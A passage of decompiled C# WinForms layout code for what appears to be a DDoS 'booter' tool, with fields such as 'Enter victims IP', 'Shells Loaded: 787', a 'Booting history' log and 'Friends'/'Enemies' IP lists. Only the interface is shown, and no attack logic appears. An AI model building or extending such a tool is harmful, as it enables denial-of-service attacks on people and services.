		((Control)labelX5).set_Location(location);
		((Control)LabelX12).set_Name("LabelX12");
		LabelX labelX6 = LabelX12;
		size = new Size(75, 23);
		((Control)labelX6).set_Size(size);
		((Control)LabelX12).set_TabIndex(35);
		LabelX12.set_Text("Website URL:");
		GroupPanel1.set_BackColor(Color.Transparent);
		((PanelControl)GroupPanel1).set_CanvasColor(SystemColors.Control);
		((PanelControl)GroupPanel1).set_ColorSchemeStyle((eDotNetBarStyle)4);
		((Control)GroupPanel1).get_Controls().Add((Control)(object)LabelX13);
		((Control)GroupPanel1).get_Controls().Add((Control)(object)TextBoxX_5);
		((Control)GroupPanel1).get_Controls().Add((Control)(object)LabelX11);
		((Control)GroupPanel1).get_Controls().Add((Control)(object)ButtonX8);
		((Control)GroupPanel1).get_Controls().Add((Control)(object)TextBoxX_4);
		((Control)GroupPanel1).set_Font(new Font("Arial", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		GroupPanel groupPanel = GroupPanel1;
		location = new Point(12, 218);
		((Control)groupPanel).set_Location(location);
		((Control)GroupPanel1).set_Name("GroupPanel1");
		GroupPanel groupPanel2 = GroupPanel1;
		size = new Size(195, 112);
		((Control)groupPanel2).set_Size(size);
		((PanelControl)GroupPanel1).get_Style().set_BackColor(Color.FromArgb(198, 195, 198));
		((PanelControl)GroupPanel1).get_Style().set_BackColor2(Color.FromArgb(132, 130, 132));
		((PanelControl)GroupPanel1).get_Style().set_BackColorGradientAngle(90);
		((PanelControl)GroupPanel1).get_Style().set_BorderBottom((eStyleBorderType)3);
		((PanelControl)GroupPanel1).get_Style().set_BorderColor(Color.Transparent);
		((PanelControl)GroupPanel1).get_Style().set_BorderColor2(Color.Transparent);
		((PanelControl)GroupPanel1).get_Style().set_BorderColorLight(Color.Transparent);
		((PanelControl)GroupPanel1).get_Style().set_BorderLeft((eStyleBorderType)3);
		((PanelControl)GroupPanel1).get_Style().set_BorderRight((eStyleBorderType)3);
		((PanelControl)GroupPanel1).get_Style().set_BorderRightColorSchemePart((eColorSchemePart)7);
		((PanelControl)GroupPanel1).get_Style().set_BorderTop((eStyleBorderType)3);
		((PanelControl)GroupPanel1).get_Style().set_Class("");
		((PanelControl)GroupPanel1).get_Style().set_CornerDiameter(4);
		((PanelControl)GroupPanel1).get_Style().set_CornerType((eCornerType)2);
		((PanelControl)GroupPanel1).get_Style().set_TextColor(Color.FromArgb(245, 255, 0, 0));
		((PanelControl)GroupPanel1).get_StyleMouseDown().set_Class("");
		((PanelControl)GroupPanel1).get_StyleMouseDown().set_CornerType((eCornerType)1);
		((PanelControl)GroupPanel1).get_StyleMouseOver().set_Class("");
		((PanelControl)GroupPanel1).get_StyleMouseOver().set_CornerType((eCornerType)1);
		((Control)GroupPanel1).set_TabIndex(33);
		((PanelControl)GroupPanel1).set_Text("Host to IP");
		((Control)LabelX13).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX13).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX13).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX13).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX13).set_ForeColor(SystemColors.Desktop);
		LabelX labelX7 = LabelX13;
		location = new Point(3, 3);
		((Control)labelX7).set_Location(location);
		((Control)LabelX13).set_Name("LabelX13");
		LabelX13.set_SingleLineColor(SystemColors.Control);
		LabelX labelX8 = LabelX13;
		size = new Size(75, 23);
		((Control)labelX8).set_Size(size);
		((Control)LabelX13).set_TabIndex(35);
		LabelX13.set_Text("Website URL:");
		((TextBoxBase)TextBoxX_5).set_BackColor(SystemColors.Menu);
		TextBoxX_5.get_Border().set_BorderColorSchemePart((eColorSchemePart)6);
		TextBoxX_5.get_Border().set_Class("DataGridViewBorder");
		TextBoxX_5.get_Border().set_CornerType((eCornerType)1);
		((Control)TextBoxX_5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)177));
		TextBoxX obj7 = TextBoxX_5;
		location = new Point(79, 67);
		((Control)obj7).set_Location(location);
		((Control)TextBoxX_5).set_Name("TextBoxX6");
		TextBoxX obj8 = TextBoxX_5;
		size = new Size(112, 20);
		((Control)obj8).set_Size(size);
		((Control)TextBoxX_5).set_TabIndex(34);
		((Control)LabelX11).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX11).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX11).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX11).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX11).set_ForeColor(SystemColors.Desktop);
		LabelX labelX9 = LabelX11;
		location = new Point(4, 67);
		((Control)labelX9).set_Location(location);
		((Control)LabelX11).set_Name("LabelX11");
		LabelX11.set_SingleLineColor(SystemColors.Control);
		LabelX labelX10 = LabelX11;
		size = new Size(61, 23);
		((Control)labelX10).set_Size(size);
		((Control)LabelX11).set_TabIndex(34);
		LabelX11.set_Text("Website IP:");
		((Control)ButtonX8).set_AccessibleRole((AccessibleRole)43);
		ButtonX8.set_ColorTable((eButtonColor)7);
		((Control)ButtonX8).set_Font(new Font("Arial Rounded MT Bold", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)ButtonX8).set_ForeColor(Color.Snow);
		ButtonX buttonX3 = ButtonX8;
		location = new Point(3, 32);
		((Control)buttonX3).set_Location(location);
		((Control)ButtonX8).set_Name("ButtonX8");
		ButtonX buttonX4 = ButtonX8;
		size = new Size(188, 29);
		((Control)buttonX4).set_Size(size);
		((Control)ButtonX8).set_TabIndex(34);
		ButtonX8.set_Text("Get Website IP");
		((TextBoxBase)TextBoxX_4).set_BackColor(SystemColors.Menu);
		TextBoxX_4.get_Border().set_BorderColorSchemePart((eColorSchemePart)6);
		TextBoxX_4.get_Border().set_Class("DataGridViewBorder");
		TextBoxX_4.get_Border().set_CornerType((eCornerType)1);
		((Control)TextBoxX_4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)177));
		TextBoxX obj9 = TextBoxX_4;
		location = new Point(81, 6);
		((Control)obj9).set_Location(location);
		((Control)TextBoxX_4).set_Name("TextBoxX5");
		TextBoxX obj10 = TextBoxX_4;
		size = new Size(110, 20);
		((Control)obj10).set_Size(size);
		((Control)TextBoxX_4).set_TabIndex(32);
		((UpDownBase)NumericUpDown1).set_BackColor(SystemColors.ActiveBorder);
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(7, 146);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(122, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(31);
		NumericUpDown numericUpDown3 = NumericUpDown1;
		decimal value = new decimal(new int[4] { 30, 0, 0, 0 });
		numericUpDown3.set_Value(value);
		((Control)ButtonX7).set_AccessibleRole((AccessibleRole)43);
		ButtonX7.set_ColorTable((eButtonColor)7);
		((Control)ButtonX7).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)ButtonX7).set_ForeColor(Color.Snow);
		ButtonX buttonX5 = ButtonX7;
		location = new Point(224, 271);
		((Control)buttonX5).set_Location(location);
		((Control)ButtonX7).set_Name("ButtonX7");
		ButtonX7.set_Shape((ShapeDescriptor)new RoundRectangleShapeDescriptor());
		ButtonX buttonX6 = ButtonX7;
		size = new Size(131, 47);
		((Control)buttonX6).set_Size(size);
		((PopupItemControl)ButtonX7).set_Style((eDotNetBarStyle)6);
		((Control)ButtonX7).set_TabIndex(30);
		ButtonX7.set_Text("Click to clear your internet cookies and cache!");
		((Control)ButtonX6).set_AccessibleRole((AccessibleRole)43);
		ButtonX6.set_ColorTable((eButtonColor)7);
		((Control)ButtonX6).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)ButtonX6).set_ForeColor(Color.Snow);
		ButtonX buttonX7 = ButtonX6;
		location = new Point(223, 218);
		((Control)buttonX7).set_Location(location);
		((Control)ButtonX6).set_Name("ButtonX6");
		ButtonX6.set_Shape((ShapeDescriptor)new RoundRectangleShapeDescriptor());
		ButtonX buttonX8 = ButtonX6;
		size = new Size(131, 47);
		((Control)buttonX8).set_Size(size);
		((PopupItemControl)ButtonX6).set_Style((eDotNetBarStyle)6);
		((Control)ButtonX6).set_TabIndex(29);
		ButtonX6.set_Text("Click to refresh the shells!");
		LabelX10.set_AutoSize(true);
		((Control)LabelX10).set_BackColor(Color.Transparent);
		((Control)LabelX10).set_BackgroundImage((Image)componentResourceManager.GetObject("LabelX10.BackgroundImage"));
		((BaseItemControl)LabelX10).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX10).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX10).set_Font(new Font("OCR A Extended", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX10).set_ForeColor(SystemColors.ButtonFace);
		((Control)LabelX10).set_ImeMode((ImeMode)1);
		LabelX labelX11 = LabelX10;
		location = new Point(-21, 4);
		((Control)labelX11).set_Location(location);
		((Control)LabelX10).set_Name("LabelX10");
		LabelX labelX12 = LabelX10;
		size = new Size(0, 0);
		((Control)labelX12).set_Size(size);
		((Control)LabelX10).set_TabIndex(28);
		((TextBoxBase)TextBox1).set_BackColor(SystemColors.ActiveBorder);
		TextBox1.get_Border().set_BorderColorSchemePart((eColorSchemePart)7);
		TextBox1.get_Border().set_Class("DataGridViewIpAddressBorder");
		TextBox1.get_Border().set_CornerType((eCornerType)1);
		TextBoxX textBox = TextBox1;
		location = new Point(7, 102);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBoxX textBox2 = TextBox1;
		size = new Size(122, 17);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(27);
		((TextBox)TextBox1).set_Text("Enter victims IP");
		((Control)LabelX1).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX1).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX1).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX1).set_Font(new Font("Berlin Sans FB", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)LabelX1).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX13 = LabelX1;
		location = new Point(134, 381);
		((Control)labelX13).set_Location(location);
		((Control)LabelX1).set_Name("LabelX1");
		LabelX labelX14 = LabelX1;
		size = new Size(115, 16);
		((Control)labelX14).set_Size(size);
		((Control)LabelX1).set_TabIndex(25);
		LabelX1.set_Text("Shells Loaded: 787");
		((Control)LabelX3).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX3).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX3).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX3).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX3).set_ForeColor(Color.Cornsilk);
		LabelX labelX15 = LabelX3;
		location = new Point(13, 125);
		((Control)labelX15).set_Location(location);
		((Control)LabelX3).set_Name("LabelX3");
		LabelX labelX16 = LabelX3;
		size = new Size(122, 15);
		((Control)labelX16).set_Size(size);
		((Control)LabelX3).set_TabIndex(22);
		LabelX3.set_Text("Time: (seconds)");
		((Control)LabelX2).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX2).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX2).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX2).set_ForeColor(Color.Cornsilk);
		LabelX labelX17 = LabelX2;
		location = new Point(13, 80);
		((Control)labelX17).set_Location(location);
		((Control)LabelX2).set_Name("LabelX2");
		LabelX labelX18 = LabelX2;
		size = new Size(75, 16);
		((Control)labelX18).set_Size(size);
		((Control)LabelX2).set_TabIndex(16);
		LabelX2.set_Text("Host:");
		TabItem1.set_AttachedControl((Control)(object)TabControlPanel1);
		TabItem1.set_Name("TabItem1");
		TabItem1.set_Text("Main");
		((Control)TabControlPanel2).set_BackgroundImageLayout((ImageLayout)0);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)CheckBoxX_1);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)TextBoxX_11);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)LabelX8);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)LabelX9);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)ListView3);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)TextBoxX_12);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)ButtonX1);
		((Control)TabControlPanel2).get_Controls().Add((Control)(object)ButtonX_3);
		TabControlPanel2.set_Dock((DockStyle)5);
		TabControlPanel tabControlPanel4 = TabControlPanel2;
		location = new Point(0, 26);
		((Control)tabControlPanel4).set_Location(location);
		((Control)TabControlPanel2).set_Name("TabControlPanel2");
		TabControlPanel tabControlPanel5 = TabControlPanel2;
		((Padding)(ref val))._002Ector(1);
		((Control)tabControlPanel5).set_Padding(val);
		TabControlPanel tabControlPanel6 = TabControlPanel2;
		size = new Size(415, 411);
		((Control)tabControlPanel6).set_Size(size);
		((PanelEx)TabControlPanel2).get_Style().get_BackColor1().set_Color(Color.Black);
		((PanelEx)TabControlPanel2).get_Style().get_BackColor2().set_Color(Color.FromArgb(64, 64, 64));
		((PanelEx)TabControlPanel2).get_Style().set_BackgroundImage((Image)componentResourceManager.GetObject("TabControlPanel2.Style.BackgroundImage"));
		((PanelEx)TabControlPanel2).get_Style().set_Border((eBorderType)1);
		((PanelEx)TabControlPanel2).get_Style().get_BorderColor().set_Color(Color.Black);
		((PanelEx)TabControlPanel2).get_Style().set_BorderSide((eBorderSide)11);
		((PanelEx)TabControlPanel2).get_Style().set_GradientAngle(90);
		((Control)TabControlPanel2).set_TabIndex(2);
		TabControlPanel2.set_TabItem(TabItem2);
		((Control)CheckBoxX_1).set_BackColor(Color.Transparent);
		((BaseItemControl)CheckBoxX_1).get_BackgroundStyle().set_Class("");
		((BaseItemControl)CheckBoxX_1).get_BackgroundStyle().set_CornerType((eCornerType)1);
		CheckBoxX obj11 = CheckBoxX_1;
		location = new Point(226, 377);
		((Control)obj11).set_Location(location);
		CheckBoxX obj12 = CheckBoxX_1;
		((Padding)(ref val))._002Ector(3, 4, 3, 4);
		((Control)obj12).set_Margin(val);
		((Control)CheckBoxX_1).set_Name("CheckBoxX1");
		CheckBoxX obj13 = CheckBoxX_1;
		size = new Size(89, 22);
		((Control)obj13).set_Size(size);
		((Control)CheckBoxX_1).set_TabIndex(24);
		CheckBoxX_1.set_Text("Show Gridlines");
		CheckBoxX_1.set_TextColor(Color.White);
		TextBoxX_11.get_Border().set_Class("TextBoxBorder");
		TextBoxX_11.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj14 = TextBoxX_11;
		location = new Point(148, 350);
		((Control)obj14).set_Location(location);
		((Control)TextBoxX_11).set_Name("TextBoxX8");
		TextBoxX obj15 = TextBoxX_11;
		size = new Size(204, 20);
		((Control)obj15).set_Size(size);
		((Control)TextBoxX_11).set_TabIndex(15);
		((Control)LabelX8).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX8).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX8).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX8).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX8).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX19 = LabelX8;
		location = new Point(148, 330);
		((Control)labelX19).set_Location(location);
		((Control)LabelX8).set_Name("LabelX8");
		LabelX labelX20 = LabelX8;
		size = new Size(99, 14);
		((Control)labelX20).set_Size(size);
		((Control)LabelX8).set_TabIndex(14);
		LabelX8.set_Text("Description:");
		((Control)LabelX9).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX9).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX9).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX9).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX9).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX21 = LabelX9;
		location = new Point(13, 330);
		((Control)labelX21).set_Location(location);
		((Control)LabelX9).set_Name("LabelX9");
		LabelX labelX22 = LabelX9;
		size = new Size(18, 14);
		((Control)labelX22).set_Size(size);
		((Control)LabelX9).set_TabIndex(13);
		LabelX9.set_Text("IP:");
		ListView3.set_Alignment((ListViewAlignment)0);
		ListView3.set_BackColor(SystemColors.Window);
		((Control)ListView3).set_BackgroundImage((Image)componentResourceManager.GetObject("ListView3.BackgroundImage"));
		ListView3.set_CheckBoxes(true);
		ListView3.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader5, ColumnHeader6 });
		ListView3.set_ForeColor(SystemColors.InactiveBorder);
		ListView listView = ListView3;
		location = new Point(4, 4);
		((Control)listView).set_Location(location);
		((Control)ListView3).set_Name("ListView3");
		ListView listView2 = ListView3;
		size = new Size(355, 320);
		((Control)listView2).set_Size(size);
		((Control)ListView3).set_TabIndex(12);
		ListView3.set_UseCompatibleStateImageBehavior(false);
		ListView3.set_View((View)1);
		ColumnHeader5.set_Text("IP");
		ColumnHeader5.set_Width(109);
		ColumnHeader6.set_Text("Description");
		ColumnHeader6.set_Width(242);
		TextBoxX_12.get_Border().set_Class("TextBoxBorder");
		TextBoxX_12.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj16 = TextBoxX_12;
		location = new Point(13, 350);
		((Control)obj16).set_Location(location);
		((Control)TextBoxX_12).set_Name("TextBoxX11");
		TextBoxX obj17 = TextBoxX_12;
		size = new Size(112, 20);
		((Control)obj17).set_Size(size);
		((Control)TextBoxX_12).set_TabIndex(11);
		((Control)ButtonX1).set_AccessibleRole((AccessibleRole)43);
		ButtonX1.set_ColorTable((eButtonColor)7);
		ButtonX buttonX9 = ButtonX1;
		location = new Point(111, 376);
		((Control)buttonX9).set_Location(location);
		((Control)ButtonX1).set_Name("ButtonX1");
		ButtonX buttonX10 = ButtonX1;
		size = new Size(99, 23);
		((Control)buttonX10).set_Size(size);
		((Control)ButtonX1).set_TabIndex(10);
		ButtonX1.set_Text("Remove");
		((Control)ButtonX_3).set_AccessibleRole((AccessibleRole)43);
		ButtonX_3.set_ColorTable((eButtonColor)7);
		ButtonX obj18 = ButtonX_3;
		location = new Point(13, 376);
		((Control)obj18).set_Location(location);
		((Control)ButtonX_3).set_Name("ButtonX10");
		ButtonX obj19 = ButtonX_3;
		size = new Size(92, 23);
		((Control)obj19).set_Size(size);
		((Control)ButtonX_3).set_TabIndex(9);
		ButtonX_3.set_Text("Add");
		TabItem2.set_AttachedControl((Control)(object)TabControlPanel2);
		TabItem2.set_Name("TabItem2");
		TabItem2.set_Text("Friends");
		((Control)TabControlPanel6).get_Controls().Add((Control)(object)CheckBoxX_2);
		((Control)TabControlPanel6).get_Controls().Add((Control)(object)ListView5);
		TabControlPanel6.set_Dock((DockStyle)5);
		TabControlPanel tabControlPanel7 = TabControlPanel6;
		location = new Point(0, 26);
		((Control)tabControlPanel7).set_Location(location);
		((Control)TabControlPanel6).set_Name("TabControlPanel6");
		TabControlPanel tabControlPanel8 = TabControlPanel6;
		((Padding)(ref val))._002Ector(1);
		((Control)tabControlPanel8).set_Padding(val);
		TabControlPanel tabControlPanel9 = TabControlPanel6;
		size = new Size(415, 411);
		((Control)tabControlPanel9).set_Size(size);
		((PanelEx)TabControlPanel6).get_Style().get_BackColor1().set_Color(Color.Black);
		((PanelEx)TabControlPanel6).get_Style().get_BackColor2().set_Color(Color.FromArgb(64, 64, 64));
		((PanelEx)TabControlPanel6).get_Style().set_BackgroundImage((Image)componentResourceManager.GetObject("TabControlPanel6.Style.BackgroundImage"));
		((PanelEx)TabControlPanel6).get_Style().set_Border((eBorderType)1);
		((PanelEx)TabControlPanel6).get_Style().get_BorderColor().set_Color(Color.Black);
		((PanelEx)TabControlPanel6).get_Style().set_BorderSide((eBorderSide)11);
		((PanelEx)TabControlPanel6).get_Style().set_GradientAngle(90);
		((Control)TabControlPanel6).set_TabIndex(4);
		TabControlPanel6.set_TabItem(TabItem9);
		((Control)CheckBoxX_2).set_BackColor(Color.Transparent);
		((BaseItemControl)CheckBoxX_2).get_BackgroundStyle().set_Class("");
		((BaseItemControl)CheckBoxX_2).get_BackgroundStyle().set_CornerType((eCornerType)1);
		CheckBoxX obj20 = CheckBoxX_2;
		location = new Point(135, 373);
		((Control)obj20).set_Location(location);
		CheckBoxX obj21 = CheckBoxX_2;
		((Padding)(ref val))._002Ector(3, 4, 3, 4);
		((Control)obj21).set_Margin(val);
		((Control)CheckBoxX_2).set_Name("CheckBoxX2");
		CheckBoxX obj22 = CheckBoxX_2;
		size = new Size(89, 22);
		((Control)obj22).set_Size(size);
		((Control)CheckBoxX_2).set_TabIndex(25);
		CheckBoxX_2.set_Text("Show Gridlines");
		CheckBoxX_2.set_TextColor(Color.White);
		((Control)ListView5).set_BackgroundImage((Image)componentResourceManager.GetObject("ListView5.BackgroundImage"));
		ListView5.set_CheckBoxes(true);
		ListView5.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[4] { ColumnHeader9, ColumnHeader10, ColumnHeader11, Time });
		ListView5.set_ForeColor(SystemColors.Window);
		ListView listView3 = ListView5;
		location = new Point(4, 4);
		((Control)listView3).set_Location(location);
		((Control)ListView5).set_Name("ListView5");
		ListView listView4 = ListView5;
		size = new Size(356, 362);
		((Control)listView4).set_Size(size);
		((Control)ListView5).set_TabIndex(20);
		ListView5.set_UseCompatibleStateImageBehavior(false);
		ListView5.set_View((View)1);
		ColumnHeader9.set_Text("IP");
		ColumnHeader9.set_Width(93);
		ColumnHeader10.set_Text("Port");
		ColumnHeader10.set_Width(72);
		ColumnHeader11.set_Text("Length");
		ColumnHeader11.set_Width(75);
		Time.set_Text("Time");
		Time.set_Width(103);
		TabItem9.set_AttachedControl((Control)(object)TabControlPanel6);
		TabItem9.set_Name("TabItem9");
		TabItem9.set_Text("Booting history");
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)CheckBoxX_0);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)TextBoxX_9);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)LabelX16);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)LabelX17);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)ListView4);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)TextBoxX_10);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)ButtonX_1);
		((Control)TabControlPanel5).get_Controls().Add((Control)(object)ButtonX_2);
		TabControlPanel5.set_Dock((DockStyle)5);
		TabControlPanel tabControlPanel10 = TabControlPanel5;
		location = new Point(0, 26);
		((Control)tabControlPanel10).set_Location(location);
		((Control)TabControlPanel5).set_Name("TabControlPanel5");
		TabControlPanel tabControlPanel11 = TabControlPanel5;
		((Padding)(ref val))._002Ector(1);
		((Control)tabControlPanel11).set_Padding(val);
		TabControlPanel tabControlPanel12 = TabControlPanel5;
		size = new Size(415, 411);
		((Control)tabControlPanel12).set_Size(size);
		((PanelEx)TabControlPanel5).get_Style().get_BackColor1().set_Color(Color.Black);
		((PanelEx)TabControlPanel5).get_Style().get_BackColor2().set_Color(Color.FromArgb(64, 64, 64));
		((PanelEx)TabControlPanel5).get_Style().set_BackgroundImage((Image)componentResourceManager.GetObject("TabControlPanel5.Style.BackgroundImage"));
		((PanelEx)TabControlPanel5).get_Style().set_Border((eBorderType)1);
		((PanelEx)TabControlPanel5).get_Style().get_BorderColor().set_Color(Color.Black);
		((PanelEx)TabControlPanel5).get_Style().set_BorderSide((eBorderSide)11);
		((PanelEx)TabControlPanel5).get_Style().set_GradientAngle(90);
		((Control)TabControlPanel5).set_TabIndex(3);
		TabControlPanel5.set_TabItem(TabItem6);
		((Control)CheckBoxX_0).set_BackColor(Color.Transparent);
		((BaseItemControl)CheckBoxX_0).get_BackgroundStyle().set_Class("");
		((BaseItemControl)CheckBoxX_0).get_BackgroundStyle().set_CornerType((eCornerType)1);
		CheckBoxX obj23 = CheckBoxX_0;
		location = new Point(226, 377);
		((Control)obj23).set_Location(location);
		CheckBoxX obj24 = CheckBoxX_0;
		((Padding)(ref val))._002Ector(3, 4, 3, 4);
		((Control)obj24).set_Margin(val);
		((Control)CheckBoxX_0).set_Name("CheckBoxX3");
		CheckBoxX obj25 = CheckBoxX_0;
		size = new Size(89, 22);
		((Control)obj25).set_Size(size);
		((Control)CheckBoxX_0).set_TabIndex(24);
		CheckBoxX_0.set_Text("Show Gridlines");
		CheckBoxX_0.set_TextColor(Color.White);
		TextBoxX_9.get_Border().set_Class("TextBoxBorder");
		TextBoxX_9.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj26 = TextBoxX_9;
		location = new Point(148, 350);
		((Control)obj26).set_Location(location);
		((Control)TextBoxX_9).set_Name("TextBoxX12");
		TextBoxX obj27 = TextBoxX_9;
		size = new Size(204, 20);
		((Control)obj27).set_Size(size);
		((Control)TextBoxX_9).set_TabIndex(22);
		((Control)LabelX16).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX16).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX16).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX16).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX16).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX23 = LabelX16;
		location = new Point(148, 330);
		((Control)labelX23).set_Location(location);
		((Control)LabelX16).set_Name("LabelX16");
		LabelX labelX24 = LabelX16;
		size = new Size(99, 14);
		((Control)labelX24).set_Size(size);
		((Control)LabelX16).set_TabIndex(21);
		LabelX16.set_Text("Description:");
		((Control)LabelX17).set_BackColor(Color.Transparent);
		((BaseItemControl)LabelX17).get_BackgroundStyle().set_Class("");
		((BaseItemControl)LabelX17).get_BackgroundStyle().set_CornerType((eCornerType)1);
		((Control)LabelX17).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)LabelX17).set_ForeColor(SystemColors.ButtonHighlight);
		LabelX labelX25 = LabelX17;
		location = new Point(13, 330);
		((Control)labelX25).set_Location(location);
		((Control)LabelX17).set_Name("LabelX17");
		LabelX labelX26 = LabelX17;
		size = new Size(18, 14);
		((Control)labelX26).set_Size(size);
		((Control)LabelX17).set_TabIndex(20);
		LabelX17.set_Text("IP:");
		((Control)ListView4).set_BackgroundImage((Image)componentResourceManager.GetObject("ListView4.BackgroundImage"));
		ListView4.set_CheckBoxes(true);
		ListView4.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader7, ColumnHeader8 });
		ListView4.set_ForeColor(SystemColors.Window);
		ListView listView5 = ListView4;
		location = new Point(4, 4);
		((Control)listView5).set_Location(location);
		((Control)ListView4).set_Name("ListView4");
		ListView listView6 = ListView4;
		size = new Size(355, 320);
		((Control)listView6).set_Size(size);
		((Control)ListView4).set_TabIndex(19);
		ListView4.set_UseCompatibleStateImageBehavior(false);
		ListView4.set_View((View)1);
		ColumnHeader7.set_Text("IP");
		ColumnHeader7.set_Width(109);
		ColumnHeader8.set_Text("Description");
		ColumnHeader8.set_Width(242);
		TextBoxX_10.get_Border().set_Class("TextBoxBorder");
		TextBoxX_10.get_Border().set_CornerType((eCornerType)1);
		TextBoxX obj28 = TextBoxX_10;
		location = new Point(13, 350);
		((Control)obj28).set_Location(location);
		((Control)TextBoxX_10).set_Name("TextBoxX13");
		TextBoxX obj29 = TextBoxX_10;
		size = new Size(112, 20);
		((Control)obj29).set_Size(size);
		((Control)TextBoxX_10).set_TabIndex(18);
		((Control)ButtonX_1).set_AccessibleRole((AccessibleRole)43);
		ButtonX_1.set_ColorTable((eButtonColor)7);
		ButtonX obj30 = ButtonX_1;
		location = new Point(111, 376);
		((Control)obj30).set_Location(location);
		((Control)ButtonX_1).set_Name("ButtonX12");
		ButtonX obj31 = ButtonX_1;
		size = new Size(99, 23);
		((Control)obj31).set_Size(size);
		((Control)ButtonX_1).set_TabIndex(17);
		ButtonX_1.set_Text("Remove");
		((Control)ButtonX_2).set_AccessibleRole((AccessibleRole)43);
		ButtonX_2.set_ColorTable((eButtonColor)7);
		ButtonX obj32 = ButtonX_2;
		location = new Point(13, 376);
		((Control)obj32).set_Location(location);
		((Control)ButtonX_2).set_Name("ButtonX13");
		ButtonX obj33 = ButtonX_2;
		size = new Size(92, 23);
		((Control)obj33).set_Size(size);
		((Control)ButtonX_2).set_TabIndex(16);
		ButtonX_2.set_Text("Add");
		TabItem6.set_AttachedControl((Control)(object)TabControlPanel5);
		TabItem6.set_Name("TabItem6");
		TabItem6.set_Text("Enemies");
		TabItem4.set_AttachedControl((Control)(object)TabControlPanel4);
		TabItem4.set_Name("TabItem4");
		TabItem4.set_Text("Enemies");
		((Control)TabControlPanel4).get_Controls().Add((Control)(object)ButtonX5);
		((Control)TabControlPanel4).get_Controls().Add((Control)(object)ButtonX4);
